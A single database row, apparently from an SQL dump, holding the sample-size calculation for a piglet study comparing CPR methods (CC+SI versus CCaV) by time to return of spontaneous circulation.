	(6438,152,'sample_size_calculation_details','\"Our primary outcome measure will be time to achieve ROSC. Our pilot studies showed a mean (standard deviation) ROSC of 700 (120) secs during CPR using CCaV. We hypothesized that CC+SI during CPR would reduce time to achieve ROSC. A sample size of 24 piglets (12 per group) was sufficient to detect a clinically important (20%) reduction in time to achieve ROSC (i.e., 700 sec vs. 560 sec), with 80% power and a 2-tailed alpha error of 0.05.\\n\"','2022-03-31 13:23:46','2022-03-31 13:23:50'),
